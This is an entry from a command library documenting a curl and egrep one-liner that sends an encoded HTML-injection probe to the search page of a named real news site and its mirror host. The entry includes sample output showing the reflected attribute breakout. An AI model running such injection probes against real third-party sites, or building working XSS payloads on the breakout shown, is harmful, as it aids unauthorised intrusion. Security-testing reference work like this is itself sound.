---
id: cmd-001
data: >-
  curl -s 'https://www.secnews.gr?s=%27%3E%3Ctest%3E%3C' | egrep -o
  ".{47}?<test>.*?>"
tags:
  - xss-test
  - injection
type: command
output: >-
  <div id="content" data-currentquery='{"s":"\\'><test><"}' class="main-content
  articles list sidebar-right non-full">
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:31.312Z'
verified: false
validated: true
submitted: true
---
# curl-egrep-verify-xss-injection

## Command

```bash
curl -s 'https://www.secnews.gr?s=%27%3E%3Ctest%3E%3C' | egrep -o ".{47}?<test>.*?>"
```

## Description

This command fetches the target search page with an XSS payload and extracts the injected HTML to verify attribute breakout.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode for curl (no progress or errors) | Yes |
| URL | Target URL with encoded payload '%27%3E%3Ctest%3E%3C' | Yes |
| `egrep -o` | Output only matching pattern | Yes |
| Pattern | ".{47}?<test>.*?>" to capture 47 chars before <test> to closing > | Yes |

## Examples

### Basic Usage

```bash
curl -s 'https://www.secnews.gr?s=%27%3E%3Ctest%3E%3C' | egrep -o ".{47}?<test>.*?>"
```

### Advanced Usage

```bash
curl -s 'https://secnews.wpengine.com?s=%27%3E%3Ctest%3E%3C' | egrep -o ".{47}?<test>.*?>" > injection.log
```

## Expected Output

The command outputs the HTML snippet showing the breakout, such as `<div id="content" data-currentquery='{"s":"\\'><test><"}' class="main-content articles list sidebar-right non-full">`, confirming the injection.

## Related

- [[Related Procedure: Test-HTML-Injection-in-Search-Functionality]]
